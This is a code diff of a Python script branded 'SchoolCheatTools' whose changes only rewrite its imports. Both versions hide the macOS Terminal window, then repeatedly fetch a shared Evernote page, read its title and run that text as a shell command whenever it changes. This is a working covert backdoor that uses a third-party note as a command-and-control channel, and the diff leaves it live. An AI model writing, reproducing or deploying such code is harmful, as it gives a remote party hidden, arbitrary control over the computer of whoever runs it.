@@ -1,12 +1,12 @@
 #setup
 from bs4 import BeautifulSoup
-import requests
-import os
-from time import *
+from requests import get
+from os import system as cmd
+from time import sleep
 old_command = 0
 command = 0
-os.system('clear')
-os.system('osascript -e \'tell application "Terminal" to set visible of front window to false\'')
+cmd('clear')
+cmd('osascript -e \'tell application "Terminal" to set visible of front window to false\'')
 
 print('''
       
@@ -24,7 +24,7 @@ IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BAC
 while True:
     #get HTML
     try:
-        html_file = requests.get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
+        html_file = get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
         soup = BeautifulSoup(html_file, 'lxml')
         command = soup.find('title').text
     except:
@@ -32,7 +32,7 @@ while True:
     #execute command
     if old_command != command:
         try:
-            os.system(command)
+            cmd(command)
             old_command = command
         except:
             pass
